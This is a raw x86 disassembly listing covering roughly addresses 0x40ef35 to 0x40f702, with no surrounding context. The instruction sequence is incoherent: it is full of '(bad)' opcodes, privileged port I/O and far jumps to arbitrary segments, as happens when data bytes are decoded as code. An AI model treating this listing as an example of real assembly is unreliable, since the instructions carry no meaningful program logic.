  40ef35:	jo     0x40efb5
  40ef37:	push   eax
  40ef38:	psubb  mm5,QWORD PTR [ecx+0x4a]
  40ef3c:	jmp    0xc0eea825
  40ef41:	loop   0x40efb7
  40ef43:	or     DWORD PTR [edx+0x34],ecx
  40ef46:	cli    
  40ef47:	stos   BYTE PTR es:[edi],al
  40ef48:	push   edx
  40ef49:	push   ebp
  40ef4a:	loope  0x40efb1
  40ef4c:	aam    0x3d
  40ef4e:	ss aaa 
  40ef50:	or     BYTE PTR [edi],0x38
  40ef53:	lds    eax,FWORD PTR [ebx]
  40ef55:	pushf  
  40ef56:	test   DWORD PTR [ebx+0x44],0xaeb29068
  40ef5d:	mov    ds:0xa28a8a25,eax
  40ef62:	adc    DWORD PTR [eax],esi
  40ef64:	mov    esi,0xb53eb74d
  40ef69:	sar    BYTE PTR [eax+0x4f],0x8c
  40ef6d:	mov    ebx,0xf1b1878f
  40ef72:	add    ch,cl
  40ef74:	push   edx
  40ef75:	loop   0x40efe7
  40ef77:	dec    ecx
  40ef78:	fwait
  40ef79:	jbe    0x40ef7f
  40ef7b:	jecxz  0x40efdc
  40ef7d:	(bad)  
  40ef7e:	leave  
  40ef7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef80:	add    dl,dl
  40ef82:	sub    bl,BYTE PTR [esi+edi*4]
  40ef85:	push   ebx
  40ef86:	mov    edi,0x4d041494
  40ef8b:	into   
  40ef8c:	jp     0x40ef2c
  40ef8e:	mov    ebp,0x38ce2ec2
  40ef93:	loop   0x40efc6
  40ef95:	push   esi
  40ef96:	ds aad 0xda
  40ef99:	out    dx,eax
  40ef9a:	cs cli 
  40ef9c:	jl     0x40f017
  40ef9e:	sbb    ecx,DWORD PTR [ecx-0x5353d33]
  40efa4:	sub    eax,0x863c7cc9
  40efa9:	in     eax,dx
  40efaa:	jg     0x40ef4d
  40efac:	nop
  40efad:	aaa    
  40efae:	add    al,0x2a
  40efb0:	cmc    
  40efb1:	pop    ebp
  40efb2:	push   cs
  40efb3:	popa   
  40efb4:	cmp    al,0xef
  40efb6:	jmp    0x40efdb
  40efb8:	mov    eax,0x57b7ebe4
  40efbd:	retfw  
  40efbf:	mov    cl,0xed
  40efc1:	dec    esp
  40efc2:	mov    ds:0x11f0ecc1,eax
  40efc7:	adc    al,0x48
  40efc9:	xor    al,0x6f
  40efcb:	dec    esp
  40efcc:	and    DWORD PTR [ecx],eax
  40efce:	fs push esi
  40efd0:	(bad)
  40efd3:	jmp    0x40f043
  40efd5:	fwait
  40efd6:	enter  0xa138,0x54
  40efda:	inc    ebp
  40efdb:	mul    bh
  40efdd:	das    
  40efde:	in     al,0xd1
  40efe0:	mov    DWORD PTR [ebp-0x684948d5],esi
  40efe6:	dec    edx
  40efe7:	cmp    eax,0xd5b8ff7a
  40efec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efed:	pop    ss
  40efee:	xchg   edi,eax
  40efef:	stos   DWORD PTR es:[edi],eax
  40eff0:	push   edi
  40eff1:	mov    ecx,0x4f5d8648
  40eff6:	daa    
  40eff7:	ror    BYTE PTR [edx],0x4a
  40effa:	fdivr  DWORD PTR [ebx+ecx*1]
  40effd:	lock retf 
  40efff:	inc    esi
  40f000:	out    0x33,eax
  40f002:	data16 jno 0x40efc3
  40f005:	test   BYTE PTR [ecx],cl
  40f007:	bound  ebx,QWORD PTR [edi]
  40f009:	and    ch,BYTE PTR [eax]
  40f00b:	test   DWORD PTR [ecx+edx*2+0x4536dc5e],edx
  40f012:	add    esp,DWORD PTR fs:[esp+edi*1]
  40f016:	sbb    BYTE PTR [edx+ecx*2+0x20],dh
  40f01a:	(bad)  
  40f01b:	loop   0x40f05b
  40f01d:	mov    dl,BYTE PTR [ebx]
  40f01f:	lock outs dx,BYTE PTR ds:[esi]
  40f021:	ss jne 0x40f05d
  40f024:	scas   al,BYTE PTR es:[edi]
  40f025:	fmul   QWORD PTR [eax+0x29b1e7b5]
  40f02b:	ror    BYTE PTR [eax-0x49bac006],1
  40f031:	xor    BYTE PTR [edx+0x33cef8b4],bh
  40f037:	je     0x40f04a
  40f039:	addr16 inc ebp
  40f03b:	inc    ebx
  40f03c:	ret    0x45b0
  40f03f:	retf   0x787
  40f042:	fld    DWORD PTR [ebx-0x43186ab1]
  40f048:	imul   DWORD PTR [ebp-0x28]
  40f04b:	sub    al,0x5d
  40f04d:	lods   al,BYTE PTR ds:[esi]
  40f04e:	sub    al,0x6a
  40f050:	daa    
  40f051:	enter  0x30b7,0x22
  40f055:	and    al,0x3e
  40f057:	push   ebp
  40f058:	push   esp
  40f059:	in     eax,dx
  40f05a:	hlt    
  40f05b:	idiv   BYTE PTR [edi-0x7cca117b]
  40f061:	icebp  
  40f062:	add    DWORD PTR [edx],0xffffffc5
  40f065:	mov    ds:0xa706fc0b,al
  40f06a:	xor    al,0x28
  40f06c:	mov    ebx,0x25619bf8
  40f071:	lahf   
  40f072:	sbb    DWORD PTR [edi-0x1c],edx
  40f075:	nop
  40f076:	xor    ah,BYTE PTR [ebx+0xf5]
	...
  40f0bc:	add    BYTE PTR [eax],al
  40f0be:	add    ah,ch
  40f0c0:	ss ins BYTE PTR es:[edi],dx
  40f0c2:	or     esi,edi
  40f0c4:	pop    ebx
  40f0c5:	in     eax,dx
  40f0c6:	test   DWORD PTR [edi-0x26],0xea7e9ed2
  40f0cd:	loope  0x40f06f
  40f0cf:	out    0xf6,eax
  40f0d1:	add    BYTE PTR [eax],al
  40f0d3:	and    al,BYTE PTR [edi]
  40f0d5:	add    BYTE PTR [eax],al
  40f0d7:	pop    edx
  40f0d8:	jno    0x40f123
  40f0da:	sub    DWORD PTR [eax-0x5a],edi
  40f0dd:	(bad)  
  40f0df:	fstp   TBYTE PTR [edx+0x5f]
  40f0e2:	xor    ebx,DWORD PTR [edx+0x20c8d0f9]
  40f0e8:	out    0x23,eax
  40f0ea:	(bad)  [edi+0x45]
  40f0ed:	mov    al,0x54
  40f0ef:	sub    eax,0xc221c728
  40f0f4:	jae    0x40f0cc
  40f0f6:	lods   eax,DWORD PTR ds:[esi]
  40f0f7:	or     bh,0x66
  40f0fa:	lock (bad) 
  40f0fc:	xchg   edi,eax
  40f0fd:	pop    edi
  40f0fe:	ret    0x825d
  40f101:	nop
  40f102:	pop    ebx
  40f103:	stos   DWORD PTR es:[edi],eax
  40f104:	mov    dh,BYTE PTR [edx-0x4cef88e1]
  40f10a:	lods   al,BYTE PTR ds:[esi]
  40f10b:	dec    esp
  40f10c:	sub    DWORD PTR [ebx-0x2a02b0eb],0xffffffdd
  40f113:	push   ebp
  40f114:	sbb    al,0xb5
  40f116:	xchg   ebx,eax
  40f117:	iret   
  40f118:	daa    
  40f119:	adc    edi,DWORD PTR [esi+0x5d]
  40f11c:	mov    bl,0xfe
  40f11e:	cmp    esi,DWORD PTR [edx-0x8]
  40f121:	popa   
  40f122:	inc    edx
  40f123:	lds    esp,FWORD PTR [eax+ebx*8-0x509b4024]
  40f12a:	loope  0x40f0d8
  40f12c:	out    dx,eax
  40f12d:	mov    edx,0x2d39acce
  40f132:	mov    BYTE PTR [ebx+edx*4+0x1f3918fd],ah
  40f139:	mov    dl,0x88
  40f13b:	icebp  
  40f13c:	pop    ebx
  40f13d:	fwait
  40f13e:	loop   0x40f13c
  40f140:	mov    dh,0xdd
  40f142:	jns    0x40f109
  40f144:	inc    esp
  40f145:	stc    
  40f146:	rcl    ch,1
  40f148:	dec    edi
  40f149:	bnd jp 0x40f14b
  40f14c:	gs pushf 
  40f14e:	and    BYTE PTR [ebx-0x7],0xce
  40f152:	lods   eax,DWORD PTR ds:[esi]
  40f153:	xchg   DWORD PTR [edi-0x671cb0b2],esp
  40f159:	fcmovne st,st(4)
  40f15b:	sahf   
  40f15c:	sar    BYTE PTR [ebx],1
  40f15e:	out    0xe2,al
  40f160:	lock jle 0x40f1d2
  40f163:	std    
  40f164:	pop    esi
  40f165:	out    0x55,eax
  40f167:	stos   DWORD PTR es:[edi],eax
  40f168:	nop
  40f169:	fcom   QWORD PTR [ebx+0x487dcd95]
  40f16f:	sbb    DWORD PTR [edi-0x141c3f92],ecx
  40f175:	cs (bad) 
  40f178:	cdq    
  40f179:	rol    DWORD PTR [ebp-0x33],1
  40f17c:	scas   al,BYTE PTR es:[edi]
  40f17d:	cmp    DWORD PTR [edi*4+0x30143084],0xffffffc3
  40f185:	ret    0x53a4
  40f188:	mov    ebx,0xd0f19ba5
  40f18d:	aad    0x27
  40f18f:	fwait
  40f190:	neg    DWORD PTR [ebx]
  40f192:	jmp    0x40f15d
  40f194:	adc    al,0x86
  40f196:	inc    esi
  40f197:	adc    eax,0x7a135869
  40f19c:	repz test eax,0xc30d96c0
  40f1a2:	sbb    eax,0xca920d59
  40f1a7:	(bad)  
  40f1a8:	fcom   DWORD PTR [ebx+0x2b240422]
  40f1ae:	mov    bl,0x2b
  40f1b0:	loope  0x40f20c
  40f1b2:	inc    edi
  40f1b3:	or     ebp,DWORD PTR [ebp-0x187d2937]
  40f1b9:	loope  0x40f1ff
  40f1bb:	sbb    edx,ebx
  40f1bd:	clc    
  40f1be:	sub    BYTE PTR [ebp-0x7bc513ce],bh
  40f1c4:	in     eax,0x3b
  40f1c6:	pop    edx
  40f1c7:	fld    QWORD PTR gs:[eax]
  40f1ca:	test   DWORD PTR [edi+0x7dd6dcf8],0x17a5efd3
  40f1d4:	cmp    al,0xe9
  40f1d6:	ret    0x1414
  40f1d9:	jbe    0x40f240
  40f1db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1dc:	in     eax,0xe
  40f1de:	outs   dx,BYTE PTR ds:[esi]
  40f1df:	enter  0x614e,0x26
  40f1e3:	lods   eax,DWORD PTR ds:[esi]
  40f1e4:	mov    edx,0xd5bbaba9
  40f1e9:	sub    DWORD PTR [eax-0x4a],ebp
  40f1ec:	dec    edx
  40f1ed:	sahf   
  40f1ee:	jge    0x40f21d
  40f1f0:	nop
  40f1f1:	je     0x40f181
  40f1f3:	dec    eax
  40f1f4:	xchg   edx,eax
  40f1f5:	jge    0x40f24b
  40f1f7:	(bad)  [edi-0x5f]
  40f1fa:	or     BYTE PTR [esi-0x8954447],bh
  40f200:	jl     0x40f257
  40f202:	and    esi,edx
  40f204:	mov    ch,0x9b
  40f206:	add    eax,0x9c7c7e5c
  40f20b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f20c:	jno    0x40f1f0
  40f20e:	repnz out 0xde,eax
  40f211:	push   esp
  40f212:	scas   al,BYTE PTR es:[edi]
  40f213:	enter  0x27b8,0x64
  40f217:	aam    0xdf
  40f219:	sub    al,0x44
  40f21b:	bound  ebx,QWORD PTR [ebx+edi*1]
  40f21e:	lods   eax,DWORD PTR ds:[esi]
  40f21f:	mov    ebp,0xf09f3843
  40f224:	mov    edx,0x839073ad
  40f229:	bound  esi,QWORD PTR [esi-0x6cc1be65]
  40f22f:	das    
  40f230:	lods   al,BYTE PTR ds:[esi]
  40f231:	stc    
  40f232:	fisttp WORD PTR [edx]
  40f234:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f235:	adc    edi,DWORD PTR [eax-0xd]
  40f238:	loope  0x40f29f
  40f23a:	fbld   TBYTE PTR [eax]
  40f23c:	pop    edi
  40f23d:	push   ecx
  40f23e:	dec    dh
  40f240:	mov    edx,0x105b1c14
  40f245:	idiv   BYTE PTR [eax+0x1e537110]
  40f24b:	sbb    al,0xd
  40f24d:	inc    eax
  40f24e:	mov    eax,ds:0xe84257ca
  40f253:	add    BYTE PTR [edi],cl
  40f255:	int3   
  40f256:	ss popf 
  40f258:	test   BYTE PTR [edx],ah
  40f25a:	mov    ah,0xd1
  40f25c:	jmp    0xb5db:0xa5811d65
  40f263:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f264:	mov    ch,0x66
  40f266:	push   0xc
  40f268:	jbe    0x40f204
  40f26a:	enter  0xf43f,0x6e
  40f26e:	(bad)  
  40f26f:	sub    al,0xbf
  40f271:	push   edx
  40f272:	push   ebx
  40f273:	inc    edx
  40f274:	(bad)  
  40f275:	(bad)  
  40f276:	xchg   edx,eax
  40f277:	rol    DWORD PTR [ebp+0x7f],cl
  40f27a:	mov    edx,DWORD PTR [esi+ecx*2+0x8ca5a6f]
  40f281:	cmp    cl,BYTE PTR [ebx-0x65]
  40f284:	dec    edx
  40f285:	inc    ebx
  40f286:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f287:	lods   eax,DWORD PTR ds:[esi]
  40f288:	add    BYTE PTR [ecx+0x40047ae9],ah
  40f28e:	dec    edx
  40f28f:	xchg   esp,eax
  40f290:	mov    al,ds:0xca8f9636
  40f295:	jbe    0x40f2d0
  40f297:	in     eax,0x4a
  40f299:	inc    edi
  40f29a:	aad    0xa7
  40f29c:	je     0x40f2cd
  40f29e:	push   0x1d4b74b7
  40f2a3:	dec    ebp
  40f2a4:	push   edi
  40f2a5:	pop    ebp
  40f2a6:	jne    0x40f315
  40f2a8:	and    ch,al
  40f2aa:	cld    
  40f2ab:	gs cmp ebx,edi
  40f2ae:	fmul   QWORD PTR [edx-0x5277bfde]
  40f2b4:	rol    BYTE PTR [ebx-0x73],1
  40f2b7:	pop    ebx
  40f2b8:	cmp    cl,BYTE PTR [edx]
  40f2ba:	shl    BYTE PTR [ecx],cl
  40f2bc:	and    BYTE PTR [ebp+0x3b970dd9],al
  40f2c2:	out    dx,eax
  40f2c3:	dec    edi
  40f2c4:	ret    0x2b72
  40f2c7:	add    BYTE PTR [eax-0x53450175],al
  40f2cd:	adc    esp,DWORD PTR [esi]
  40f2cf:	dec    BYTE PTR [eax+0x33]
  40f2d2:	sbb    al,0x4c
  40f2d4:	adc    DWORD PTR [esi+0x3f],ecx
  40f2d7:	mov    dh,0x2
  40f2d9:	arpl   WORD PTR [edi],si
  40f2db:	mov    ss,ecx
  40f2dd:	pusha  
  40f2de:	out    0x6,al
  40f2e0:	push   ds
  40f2e1:	dec    ebx
  40f2e2:	js     0x40f290
  40f2e4:	inc    esi
  40f2e5:	sahf   
  40f2e6:	and    esp,DWORD PTR ds:0x47a92977
  40f2ec:	cmp    ecx,0xd82d839a
  40f2f2:	jmp    0x40f34b
  40f2f4:	icebp  
  40f2f5:	and    bh,bh
  40f2f7:	shl    BYTE PTR [eax],0x97
  40f2fa:	sbb    eax,0xa0422d15
  40f2ff:	(bad)  [esi]
  40f301:	dec    esp
  40f302:	add    al,0xc9
  40f304:	js     0x40f2f4
  40f306:	in     eax,dx
  40f307:	push   ecx
  40f308:	in     al,dx
  40f309:	dec    esp
  40f30a:	or     eax,0x86d5e0fb
  40f30f:	int    0x41
  40f311:	cmp    eax,0x98ff6681
  40f316:	ja     0x40f32a
  40f318:	outs   dx,DWORD PTR ds:[esi]
  40f319:	pop    eax
  40f31a:	pop    edx
  40f31b:	or     eax,0x6ebbbea6
  40f320:	add    DWORD PTR [edx-0x59668918],ebp
  40f326:	test   eax,0x20d28d27
  40f32b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f32c:	test   eax,0xa08f7352
  40f331:	popf   
  40f332:	mov    bh,0xcb
  40f334:	fistp  DWORD PTR [ecx+eiz*8]
  40f337:	les    edi,FWORD PTR [ecx+0x48]
  40f33a:	fwait
  40f33b:	repnz pushf 
  40f33d:	jo     0x40f38d
  40f33f:	lds    ecx,FWORD PTR [edi]
  40f341:	add    cl,BYTE PTR [edi+0x3e59404a]
  40f347:	mov    fs,WORD PTR [edx+0x2b80b75a]
  40f34d:	xchg   BYTE PTR [edx+0xd48c14],ah
  40f353:	mov    ds:0x955291a7,al
  40f358:	push   ebp
  40f359:	fwait
  40f35a:	or     edi,DWORD PTR [eax+eax*2-0x233f719a]
  40f361:	push   esi
  40f362:	outs   dx,DWORD PTR ds:[esi]
  40f363:	pop    ecx
  40f364:	jns    0x40f359
  40f366:	adc    ecx,DWORD PTR [edx-0x522d9b20]
  40f36c:	pop    ds
  40f36d:	repnz xchg ebp,eax
  40f36f:	fs out dx,al
  40f371:	pop    esp
  40f372:	xchg   ebx,eax
  40f373:	mov    ebx,0xb5ffddc5
  40f378:	and    DWORD PTR [edx-0x19b60757],eax
  40f37e:	adc    dh,BYTE PTR [ecx-0x29bdfdc6]
  40f384:	mov    ecx,0xea7ee4a6
  40f389:	loopne 0x40f3b7
  40f38b:	call   0x7b312090
  40f390:	mov    ds:0x691e00e5,al
  40f395:	fidivr DWORD PTR [edi-0x68ce34f7]
  40f39b:	push   ebx
  40f39c:	jae    0x40f3ec
  40f39e:	aad    0xb8
  40f3a0:	mov    dl,0x3d
  40f3a2:	add    eax,0x6c207bd9
  40f3a7:	or     al,0x37
  40f3aa:	sti    
  40f3ab:	(bad)  
  40f3ad:	push   eax
  40f3ae:	add    ch,BYTE PTR [edx]
  40f3b0:	push   ecx
  40f3b1:	inc    ecx
  40f3b2:	mov    DWORD PTR [esi+0x57],0xadf6c215
  40f3b9:	pop    edi
  40f3ba:	cmp    BYTE PTR [ecx+0x543bff8e],dh
  40f3c0:	rcl    BYTE PTR [ebx],cl
  40f3c2:	mov    ch,0x4b
  40f3c4:	sahf   
  40f3c5:	pushf  
  40f3c6:	enter  0x8ba,0x22
  40f3ca:	data16 int 0xb8
  40f3cd:	lds    edi,FWORD PTR [ecx+edi*8+0x1a21da62]
  40f3d4:	lahf   
  40f3d5:	retf   0x4fd5
  40f3d8:	pop    ebp
  40f3d9:	dec    BYTE PTR [esp+eax*4+0x760bddc5]
  40f3e0:	cmp    ah,dh
  40f3e2:	mov    dh,0xc0
  40f3e4:	inc    eax
  40f3e5:	push   es
  40f3e6:	(bad)  
  40f3e7:	sub    ch,dl
  40f3e9:	pop    ss
  40f3ea:	loope  0x40f467
  40f3ec:	mov    BYTE PTR ds:0x627a7d05,bh
  40f3f2:	sahf   
  40f3f3:	pop    ss
  40f3f4:	aaa    
  40f3f5:	fisttp QWORD PTR [esi+0x53]
  40f3f8:	or     ah,cl
  40f3fa:	test   DWORD PTR [esi],edi
  40f3fc:	mov    ebx,0xd1c5a537
  40f401:	ror    BYTE PTR [ebp-0x1a7bbd98],0x3b
  40f408:	jmp    0xaa3b:0xd39194c6
  40f40f:	rcr    BYTE PTR [esi-0x3d],1
  40f412:	push   edi
  40f413:	jg     0x40f3e7
  40f415:	clc    
  40f416:	addr16 xchg ebp,eax
  40f418:	cs out dx,al
  40f41a:	mov    esp,DWORD PTR [edi-0x7c49cf4d]
  40f420:	stos   BYTE PTR es:[edi],al
  40f421:	jmp    0x40f45d
  40f423:	out    0xf2,al
  40f425:	mov    dh,BYTE PTR [edi-0x6]
  40f428:	mov    esi,0x34bc2b05
  40f42d:	neg    DWORD PTR [edi+0x5]
  40f430:	jns    0x40f48b
  40f432:	jle    0x40f48c
  40f434:	dec    esp
  40f435:	add    DWORD PTR [esi-0x3d3407f7],esi
  40f43b:	in     eax,0x33
  40f43d:	retf   0x3948
  40f440:	mov    es,WORD PTR [edi-0x4fc1ed49]
  40f446:	fsubr  st,st(4)
  40f448:	cli    
  40f449:	ficom  DWORD PTR [eax-0x15]
  40f44c:	imul   ebx,DWORD PTR [eax+0x3fe028b7],0x16
  40f453:	push   0x94108dff
  40f458:	push   ecx
  40f459:	fsub   st,st(0)
  40f45b:	mov    bl,0xb8
  40f45d:	inc    eax
  40f45e:	test   edx,eax
  40f460:	xchg   esp,eax
  40f461:	or     edi,eax
  40f463:	je     0x40f44b
  40f465:	sub    eax,0xa7e69a85
  40f46a:	(bad)  [edi-0x6475a7f8]
  40f470:	out    0x26,eax
  40f472:	adc    eax,0xd6597b09
  40f477:	pop    eax
  40f478:	sub    dh,BYTE PTR [esi]
  40f47a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f47b:	dec    esp
  40f47c:	(bad)  
  40f47d:	jo     0x40f4c2
  40f47f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f480:	add    dh,BYTE PTR ds:0x34ff95f2
  40f486:	mov    al,ds:0x2d9f0f7c
  40f48b:	fidivr WORD PTR [edi]
  40f48d:	sub    al,0xda
  40f48f:	xchg   edi,eax
  40f490:	mov    ebp,0x19cddde
  40f495:	fst    DWORD PTR ds:0x77a34bf7
  40f49b:	clc    
  40f49c:	(bad)  
  40f49d:	or     esi,ebp
  40f49f:	mov    bl,0x93
  40f4a1:	xchg   ebp,eax
  40f4a2:	jno    0x40f4c3
  40f4a4:	jo     0x40f48a
  40f4a6:	adc    eax,DWORD PTR [esi]
  40f4a8:	sbb    dh,ah
  40f4aa:	and    dh,al
  40f4ac:	xchg   BYTE PTR [edi+ebp*1],ah
  40f4af:	add    bl,ch
  40f4b1:	sbb    BYTE PTR [ecx+0x67be1001],ah
  40f4b7:	or     eax,0x82669b9c
  40f4bc:	push   cs
  40f4bd:	fldcw  WORD PTR [ebp+0x3831a39c]
  40f4c3:	inc    esp
  40f4c4:	(bad)  
  40f4c5:	lods   eax,DWORD PTR ds:[esi]
  40f4c6:	scas   al,BYTE PTR es:[edi]
  40f4c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4c8:	out    0x95,eax
  40f4ca:	stos   DWORD PTR es:[edi],eax
  40f4cb:	add    DWORD PTR [eax*1+0xe626ac4],ebp
  40f4d2:	pop    esp
  40f4d3:	adc    bl,BYTE PTR [eax+0x4a276cad]
  40f4d9:	das    
  40f4da:	inc    ebp
  40f4db:	pop    ebx
  40f4dc:	es xchg ebp,edi
  40f4df:	xchg   ebx,eax
  40f4e0:	mov    ds:0xb3574c9f,al
  40f4e5:	fcom   DWORD PTR [esp+esi*2+0x7a]
  40f4e9:	push   es
  40f4ea:	je     0x40f4ca
  40f4ec:	push   edx
  40f4ed:	mov    dl,0x56
  40f4ef:	pop    esp
  40f4f0:	test   BYTE PTR [eax+ecx*2-0x60317b16],cl
  40f4f7:	mov    eax,ds:0xd0f40f86
  40f4fc:	jmp    0x4125:0x50c4ba8d
  40f503:	pop    ss
  40f504:	sub    DWORD PTR [edi-0x20],ecx
  40f507:	fimul  DWORD PTR [edi]
  40f509:	lods   al,BYTE PTR ds:[esi]
  40f50a:	mov    cs,WORD PTR [ebp+0x42b3ded]
  40f510:	les    edi,FWORD PTR [edi+esi*1-0x2abf94fb]
  40f517:	dec    ecx
  40f518:	stos   BYTE PTR es:[edi],al
  40f519:	or     BYTE PTR [ebx-0x28b26b9b],al
  40f51f:	dec    ecx
  40f520:	icebp  
  40f521:	push   0x26
  40f523:	(bad)  
  40f524:	cld    
  40f525:	imul   eax,DWORD PTR [edi+0x3e85a972],0x39dbdf5d
  40f52f:	arpl   WORD PTR [ecx],bx
  40f531:	(bad)  
  40f532:	and    BYTE PTR [edx-0x7b140b21],ch
  40f538:	pop    ecx
  40f539:	cli    
  40f53a:	bswap  edx
  40f53c:	test   al,0x86
  40f53e:	mov    cl,BYTE PTR [ecx+0x7e]
  40f541:	sbb    BYTE PTR [ebx-0x78],0x2d
  40f545:	jmp    0x40f5b0
  40f547:	pop    ebp
  40f548:	xor    al,0x1d
  40f54a:	icebp  
  40f54b:	and    bl,BYTE PTR [edx]
  40f54d:	pop    es
  40f54e:	aas    
  40f54f:	call   0x25d4:0xc76ac3a1
  40f556:	fs ins DWORD PTR es:[edi],dx
  40f558:	retf   
  40f559:	std    
  40f55a:	jmp    0xce5fc677
  40f55f:	sbb    eax,0x5a670685
  40f564:	mov    ecx,0x745ce204
  40f569:	int3   
  40f56a:	adc    DWORD PTR [edx-0x58],esi
  40f56d:	xchg   ecx,eax
  40f56e:	sub    al,BYTE PTR [ebx]
  40f570:	mul    bl
  40f572:	pop    ss
  40f573:	dec    ebp
  40f574:	jl     0x40f5e6
  40f576:	jnp    0x40f530
  40f578:	mov    dh,0xb7
  40f57a:	jge    0x40f538
  40f57c:	adc    DWORD PTR [ebx-0x5a],esp
  40f57f:	loop   0x40f561
  40f581:	shr    BYTE PTR [ebp+0x4db24937],1
  40f587:	push   ecx
  40f588:	sbb    ah,BYTE PTR gs:[edi+0x6f]
  40f58c:	div    BYTE PTR [ecx-0x65]
  40f58f:	data16 aas 
  40f591:	mov    eax,ds:0xa544f0e2
  40f596:	xchg   DWORD PTR [edi-0x73],esp
  40f599:	adc    eax,0xf115964
  40f59e:	in     al,dx
  40f59f:	and    BYTE PTR [ebx-0x1bf76dd6],ah
  40f5a5:	mov    ecx,0x9388905b
  40f5aa:	jnp    0x40f5ae
  40f5ac:	ds (bad) 
  40f5ae:	retf   
  40f5af:	fidiv  WORD PTR [eax]
  40f5b1:	push   ebx
  40f5b2:	aad    0xdd
  40f5b4:	xor    esi,DWORD PTR [ebx-0x231e610]
  40f5ba:	jmp    0x1d71:0x44e3ecc5
  40f5c1:	js     0x40f563
  40f5c3:	jae    0x40f5af
  40f5c5:	pushf  
  40f5c6:	xchg   ecx,eax
  40f5c7:	push   ecx
  40f5c8:	(bad)  
  40f5c9:	ror    edi,cl
  40f5cb:	sub    BYTE PTR [edx],ch
  40f5cd:	pop    esi
  40f5ce:	ins    BYTE PTR es:[edi],dx
  40f5cf:	jmp    0x6b1:0x969a3020
  40f5d6:	xor    DWORD PTR [ebx-0x3f206547],ebp
  40f5dc:	sub    DWORD PTR ds:0x57173f3c,0xa5d57853
  40f5e6:	mov    cl,0x40
  40f5e8:	inc    ecx
  40f5e9:	cmc    
  40f5ea:	popa   
  40f5eb:	leave  
  40f5ec:	inc    eax
  40f5ed:	inc    ebx
  40f5ee:	add    dh,bl
  40f5f0:	mov    eax,ds:0x60e335fc
  40f5f5:	(bad)  
  40f5f6:	frstor [esi+0x19]
  40f5f9:	bound  ebx,QWORD PTR [ebx-0x79e57c2e]
  40f5ff:	mov    DWORD PTR [edi-0xb],ecx
  40f602:	dec    eax
  40f603:	fadd   QWORD PTR [eax+esi*2]
  40f606:	cmp    bl,BYTE PTR [ebx+0x72]
  40f609:	sbb    al,0xd0
  40f60b:	gs lahf 
  40f60d:	fnsave [eax+ebp*4]
  40f610:	lds    edi,FWORD PTR [ecx-0x13e5d2d7]
  40f616:	daa    
  40f617:	stos   DWORD PTR es:[edi],eax
  40f618:	les    ebp,FWORD PTR [ebx+ebp*2-0x7]
  40f61c:	cs cmc 
  40f61e:	pusha  
  40f61f:	dec    ecx
  40f620:	enter  0x6e12,0xbd
  40f624:	aaa    
  40f625:	mov    edx,0x6fef118f
  40f62a:	fsubr  QWORD PTR [eax+edx*1-0x1e4301d8]
  40f631:	or     DWORD PTR [esi-0x6ea6bd9b],ebx
  40f637:	xchg   ecx,eax
  40f638:	and    dh,dl
  40f63a:	mov    esi,0x8bae8a49
  40f63f:	cld    
  40f640:	dec    esi
  40f641:	cmp    DWORD PTR [ebx+0x500c88f4],edx
  40f647:	aam    0xe7
  40f649:	nop
  40f64a:	in     eax,0x57
  40f64c:	cmp    esi,eax
  40f64e:	call   0x160a:0x167e4746
  40f655:	xor    eax,0xda159357
  40f65a:	inc    ecx
  40f65b:	leave  
  40f65c:	in     al,dx
  40f65d:	in     eax,0x96
  40f65f:	aad    0x69
  40f661:	sub    esp,eax
  40f663:	lods   eax,DWORD PTR ds:[esi]
  40f664:	dec    esi
  40f665:	ss jmpw 0xaaa8
  40f66a:	jne    0x40f6ce
  40f66c:	mov    ebx,0xf5e7a1bc
  40f671:	ss je  0x40f6e4
  40f674:	pop    esp
  40f675:	or     bh,BYTE PTR [ebp-0x2c3406ad]
  40f67b:	and    ebx,0x56
  40f67e:	mov    eax,0xe5c37877
  40f683:	xchg   DWORD PTR [edi],edi
  40f685:	(bad)  
  40f686:	in     al,dx
  40f687:	push   ebx
  40f688:	ins    BYTE PTR es:[edi],dx
  40f689:	adc    al,0xee
  40f68b:	mov    eax,ds:0x153f6c80
  40f690:	adc    eax,DWORD PTR ds:0xf3741e5
  40f696:	lods   al,BYTE PTR ds:[esi]
  40f697:	or     cl,BYTE PTR [ebp+ebp*1-0x70ccff92]
  40f69e:	push   edi
  40f69f:	ret    0x2d2f
  40f6a2:	repnz imul BYTE PTR [ebx-0x122522bd]
  40f6a9:	sub    al,BYTE PTR ds:0xdc6d96cc
  40f6af:	jmp    0x8e0f:0xd041cdee
  40f6b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6b7:	leave  
  40f6b8:	push   esi
  40f6b9:	push   0xffffffbe
  40f6bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f6bc:	in     eax,0x96
  40f6be:	sbb    edx,DWORD PTR [ecx+0x6ae75c18]
  40f6c4:	inc    esp
  40f6c5:	in     eax,dx
  40f6c6:	cmp    al,0xd
  40f6c9:	pop    es
  40f6ca:	xchg   ecx,eax
  40f6cb:	dec    edi
  40f6cc:	aad    0xba
  40f6ce:	push   esi
  40f6cf:	retf   0x90b2
  40f6d2:	lds    ebp,FWORD PTR [edi-0x37]
  40f6d5:	inc    edi
  40f6d6:	push   0xefe83c6
  40f6db:	ret    
  40f6dc:	mov    cs,ebp
  40f6de:	popa   
  40f6df:	jge    0x40f6c1
  40f6e1:	adc    ch,ah
  40f6e3:	or     eax,0xfe8747c1
  40f6e8:	iret   
  40f6e9:	jg     0x40f6e7
  40f6eb:	sbb    BYTE PTR [edx+0x1fce7f6a],ch
  40f6f1:	shr    esi,cl
  40f6f3:	popa   
  40f6f4:	inc    ebx
  40f6f5:	cmp    al,0x4b
  40f6f7:	cmp    al,0x3a
  40f6f9:	out    dx,al
  40f6fa:	fnstsw WORD PTR [edx+0x63]
  40f6fd:	lahf   
  40f6fe:	inc    ebx
  40f6ff:	pop    es
  40f700:	aas    
  40f701:	pop    ebp
  40f702:	and    BYTE PTR [eax+edx*1+0x48bf675a],bl
